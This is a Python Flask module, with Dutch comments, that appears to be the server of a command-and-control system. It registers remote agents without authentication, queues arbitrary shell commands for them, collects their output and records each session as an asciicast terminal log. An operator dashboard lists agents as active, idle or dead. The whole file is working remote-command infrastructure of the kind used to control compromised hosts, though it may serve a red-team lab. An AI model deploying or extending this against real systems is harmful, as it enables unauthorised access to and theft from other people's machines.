import json
import re
import time
from datetime import datetime
from pathlib import Path
from secrets import token_urlsafe

from flask import Blueprint, jsonify, render_template, request

from app import db
from meuk.flask.models import db_agents, db_commands
from meuk.flask.security import require_dashboard_access

agent_bp = Blueprint('agent_bp', __name__,
                     template_folder='html',
                     static_folder='../../static')

_LOGS_DIR = Path.cwd() / "meuk" / "logs"
_RE_SAFE = re.compile(r'[^a-zA-Z0-9_.-]')


# ── Asciicast v2 recording helpers ─────────────────────────────────────

def _rec_filename(agent):
    """Genereer een veilige .rec bestandsnaam voor deze agent."""
    safe_host = _RE_SAFE.sub('_', agent.hostname or 'unknown')[:32]
    short_id = agent.agent_id[:12]
    return f"agent-{safe_host}-{short_id}.rec"


def _rec_path(agent):
    return _LOGS_DIR / _rec_filename(agent)


def _rec_init(agent):
    """Schrijf asciicast v2 header als het .rec bestand nog niet bestaat."""
    _LOGS_DIR.mkdir(parents=True, exist_ok=True)
    path = _rec_path(agent)
    if path.exists():
        return
    header = {
        "version": 2,
        "width": 120,
        "height": 40,
        "timestamp": int(time.time()),
        "title": f"Agent {agent.hostname} ({agent.username}@{agent.ip})",
        "env": {"SHELL": "/bin/bash", "TERM": "xterm-256color"},
    }
    with open(path, "w") as f:
        f.write(json.dumps(header) + "\n")
    # Sla de starttijd op als attribuut op het db record
    agent._rec_t0 = time.time()


def _rec_append(agent, event_type, data):
    """Voeg een asciicast event toe aan het .rec bestand."""
    path = _rec_path(agent)
    if not path.exists():
        _rec_init(agent)
    # Bereken relatieve tijd sinds start van de recording
    try:
        with open(path, "r") as f:
            header = json.loads(f.readline())
        t0 = header.get("timestamp", time.time())
    except (OSError, json.JSONDecodeError):
        t0 = time.time()
    elapsed = round(time.time() - t0, 6)
    with open(path, "a") as f:
        f.write(json.dumps([elapsed, event_type, data]) + "\n")


def _rec_command(agent, command_text):
    """Log een commando als terminal input in de recording."""
    # Toon als groene prompt + commando
    prompt = f"\033[1;32m{agent.username}@{agent.hostname}\033[0m:\033[1;34m~\033[0m$ "
    _rec_append(agent, "o", prompt + command_text + "\r\n")


def _rec_response(agent, response_text):
    """Log command output in de recording."""
    if response_text:
        # Zorg dat elke regel eindigt met \r\n voor correcte terminal rendering
        lines = response_text.replace('\r\n', '\n').replace('\r', '\n')
        _rec_append(agent, "o", lines.replace('\n', '\r\n'))
        if not lines.endswith('\n'):
            _rec_append(agent, "o", "\r\n")


# ── Agent callback endpoints (geen dashboard auth, agent_id validatie) ──

@agent_bp.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    data = request.get_json(silent=True) or {}
    aid = token_urlsafe(24)
    now = datetime.utcnow()
    agent = db_agents(
        agent_id=aid,
        hostname=data.get('hostname', 'unknown'),
        username=data.get('username', 'unknown'),
        os_info=data.get('os_info', 'unknown'),
        ip=request.remote_addr,
        script=data.get('script', 'unknown'),
        last_seen=now,
        registered=now,
    )
    db.session.add(agent)
    db.session.commit()
    # Start asciicast recording
    _rec_init(agent)
    _rec_append(agent, "o",
                f"\033[1;33m[Agent checkin]\033[0m {agent.hostname} "
                f"({agent.username}@{agent.ip}) — {agent.os_info} "
                f"[{agent.script}]\r\n\r\n")
    return jsonify({"agent_id": aid, "freq": 3}), 200


@agent_bp.route("/agent/cmd/<agent_id>", methods=["GET"])
def agent_get_cmd(agent_id):
    agent = db_agents.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return '', 404
    agent.last_seen = datetime.utcnow()
    cmd = db_commands.query.filter_by(agent_id=agent_id, status='queued') \
        .order_by(db_commands.id.asc()).first()
    if not cmd:
        db.session.commit()
        return '', 204
    cmd.status = 'sent'
    db.session.commit()
    # Log het commando in de recording
    _rec_command(agent, cmd.command)
    return jsonify({"id": cmd.id, "command": cmd.command}), 200


@agent_bp.route("/agent/res/<int:cmd_id>", methods=["POST"])
def agent_post_res(cmd_id):
    cmd = db.session.get(db_commands, cmd_id)
    if not cmd:
        return '', 404
    cmd.response = request.get_data(as_text=True)
    cmd.status = 'done'
    cmd.completed = datetime.utcnow()
    db.session.commit()
    # Log de response in de recording
    agent = db_agents.query.filter_by(agent_id=cmd.agent_id).first()
    if agent:
        _rec_response(agent, cmd.response)
    return '', 200


@agent_bp.route("/agent/heartbeat/<agent_id>", methods=["POST"])
def agent_heartbeat(agent_id):
    agent = db_agents.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return '', 404
    agent.last_seen = datetime.utcnow()
    db.session.commit()
    return '', 200


# ── Dashboard endpoints (require_dashboard_access) ──────────────────

@agent_bp.route("/dashboard/agents")
def agents_dashboard():
    require_dashboard_access()
    return render_template("agents.html")


@agent_bp.route("/api/agents")
def api_agents_list():
    require_dashboard_access()
    agents = db_agents.query.order_by(db_agents.last_seen.desc()).all()
    now = datetime.utcnow()
    result = []
    for a in agents:
        delta = (now - a.last_seen).total_seconds() if a.last_seen else 9999
        if delta < 30:
            status = 'active'
        elif delta < 300:
            status = 'idle'
        else:
            status = 'dead'
        rec = _rec_filename(a)
        result.append({
            'id': a.id,
            'agent_id': a.agent_id,
            'hostname': a.hostname,
            'username': a.username,
            'os_info': a.os_info,
            'ip': a.ip,
            'script': a.script,
            'last_seen': a.last_seen.isoformat() if a.last_seen else None,
            'registered': a.registered.isoformat() if a.registered else None,
            'status': status,
            'delta': int(delta),
            'recording': rec if (_LOGS_DIR / rec).exists() else None,
        })
    return jsonify(result)


@agent_bp.route("/api/agents/<agent_id>/history")
def api_agent_history(agent_id):
    require_dashboard_access()
    cmds = db_commands.query.filter_by(agent_id=agent_id) \
        .order_by(db_commands.id.asc()).all()
    result = []
    for c in cmds:
        result.append({
            'id': c.id,
            'command': c.command,
            'response': c.response,
            'status': c.status,
            'created': c.created.isoformat() if c.created else None,
            'completed': c.completed.isoformat() if c.completed else None,
        })
    return jsonify(result)


@agent_bp.route("/api/agents/<agent_id>/command", methods=["POST"])
def api_agent_command(agent_id):
    require_dashboard_access()
    agent = db_agents.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({"error": "agent not found"}), 404
    data = request.get_json(silent=True) or {}
    command_text = data.get('command', '').strip()
    if not command_text:
        return jsonify({"error": "empty command"}), 400
    cmd = db_commands(
        agent_id=agent_id,
        command=command_text,
        status='queued',
        created=datetime.utcnow(),
    )
    db.session.add(cmd)
    db.session.commit()
    return jsonify({"id": cmd.id, "status": "queued"}), 200


@agent_bp.route("/api/agents/<agent_id>", methods=["DELETE"])
def api_agent_delete(agent_id):
    require_dashboard_access()
    agent = db_agents.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({"error": "agent not found"}), 404
    db_commands.query.filter_by(agent_id=agent_id).delete()
    db.session.delete(agent)
    db.session.commit()
    return '', 204
